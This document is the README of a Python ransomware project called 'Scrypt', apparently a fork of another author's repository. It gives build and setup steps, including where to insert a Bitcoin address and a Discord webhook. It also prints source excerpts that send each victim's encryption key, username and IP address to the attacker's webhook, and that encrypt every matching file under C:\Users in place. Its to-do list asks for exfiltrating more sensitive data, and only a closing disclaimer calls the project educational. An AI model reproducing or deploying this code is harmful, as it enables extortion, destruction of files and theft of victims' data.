i didn't create this thing btw,
original creator: https://github.com/backslash
i just forked his repo before his account got deleted.

<div>
  <h1 align="center">Scrypt</h1>
  <h3 align="center">Ransomware with Discord Integration</h3>
</div>

 <p align="center">
  <img width="660" height="300" src="https://github.com/REVENGE977/ScryptRansomware/blob/master/images/ransomware.jpg?raw=true">
</p>

  Scrypt is a windows Ransomware with discord integration. After trying to find a reason to procrastinate a friend gave me the idea to speedrun making ransomware, so that I did. After around 5 hours I finished up Scrypt and this is the repo containing the full source code to the ransomware, the decrypter along with some notes on how it operates. What sets Scrypt aside from all the other Ransomware clones out there is its utilization of discord webhooks to send user reports.
  
<h3 align="center">Scrypt Attack Vectors</h4>
  Once you are hit by Scrypt you will instantly realize you are a victim. A giant screen warning the user (as shown below) will take up your entire screen, once you hit the continue button the window will become invisble so it can continue to run in the background. While I had wanted to use chacha20 for file encryption I ended up sticking to AES-128 due to my limited time.
 <p align="center">
  <img width="660" height="300" src="https://github.com/REVENGE977/ScryptRansomware/blob/master/images/lockscreen.png?raw=true">
</p>
  
  Another feature of Scrypt is its easy report feature which gives you a detailed report of your victim, I used myself below as an example for how the data looks, this can be used to easily match client ID's.
 <p align="center">
  <img width="460" height="300" src="https://github.com/REVENGE977/ScryptRansomware/blob/master/images/report.PNG?raw=true">
</p>

  Scrypt will also leave behind a nice little readme on the desktop just in case the client forgets any of his information. This will contain information such as your btc address, client, id and detailed steps to recovering there files. 
   <p align="center">
  <img width="460" height="300" src="https://github.com/REVENGE977/ScryptRansomware/blob/master/images/note.PNG?raw=true">
</p>

<h3 align="center">Setup</h4>

  Setup is straight forward, run the following commands as listed here:
```
  pip install pyqt5
  pip install requests
  pip install pyinstaller
  pip install pycrypto
```
  Once you have all the dependencies installed go to your python file and modify this to include your information:
```
btcAdd = ""
email = ""
discordWebhook = ""
```
  After you have fully set this up head over to command prompt and run the following commands:
```
  cd "your folder path to scrypt"
```
  then run
```
  pyinstaller --onefile "Scrypt.py"
```
  Wait for it to finish building and thats about it for setup.  

<h3 align="center">Understanding the Code</h4>
Scrypt starts off with the flashing screen to grab the users attention however in the background the ransomware itself runs, it starts of by sending a message which just gives a detailed report of our user along with the unique id and seeded password.

`````
	def sendMessage(self):
		try:
			self.getUserDetails() #trys to retrieve information about the user
		except:
			pass
		data = {
				"embeds": [
					{
					   "title": "**__Victim Report__:**", #uses said datain the report 
						"description": f"```css\nUSERID: {self.randomId}``` ```css\nKEY: {self.encryptionPass}``` ```css\nUSERNAME: {self.userName}``` ```css\nIP: {self.ip}```",
						"color": 13959168,
						"thumbnail": {
						"url": "https://www.pngkit.com/png/full/168-1680567_69137579-pentagram-with-demon-baphomet-satanic-goat.png"
					},
						"author": {
							"name": "Scrypt",
							"icon_url": "https://i.imgur.com/F3j7z5K.png"
							}
					}
				]
			}
		r = requests.post(discordWebhook, json=data) #makes a post request to our webhook with given data
`````

 Next starts the file encryption, our ransomware goes through every file in the provided folder path, in this case being `C:\\Users\\` and then proceeds to get handles for each filepath which will be passed as an argument for when we want to encrypt our files.  
```
	def run(self):
		self.sendMessage() #---------| Calls our function to send our user report via post request to our webhook.
		for root, directories, files in os.walk(self.filePath): #We are now itterating through our directories
			for filename in files: #now we are getting all of our files
				filepath = os.path.join(root, filename) 
				for base in fileTypes:
					if base in filepath:
						threading.Thread(target=self.encryptFile, args=(filepath,)).start() #multithreading our file encryption 
		
		self.readMe() #Creating our read me document
```
Each file is opened in read binary mode which is then encrypted with our pycrypto library with proper padding, then we flush the file contents and write our new file. 
  
```
	def encryptFile(self, file):
		try:
			with open(file, 'rb') as infile:
				content = self.crypto.encrypt(pad(infile.read(),32))
				with open(file, "wb") as outfile:
					outfile.write(content)
					outfile.close()
		except:
			pass
```
<h3 align="center">To Do List</h4>
  Hello fellow developers, if you are interested in contributing to Scrypt I will happily accept pushes for new features or improvements to the current version, this was made in 5 hours so its got a few things that could for sure use improvement:
  - [ ] Improve File Handeling (Change Extenstion not hard to do os.rename())
  - [ ] Give the decrypter a user interface.
  - [ ] Speed up the encryption proccess
  - [ ] Send more data/sensitive data via webhook.  
  - [ ] Create a builder for Scrypt for easier generation
  - [ ] Change encryption to salsa20 or chacha20  

  
  
<h3 align="center">Legal Notice</h4>
  This is illegal if you use this without the consent of others, I am not accountable for anything you get into, this was just a speedrun to demonstrate how ransomware is made/looks. This is 100% educational. Please do not misuse this tool.

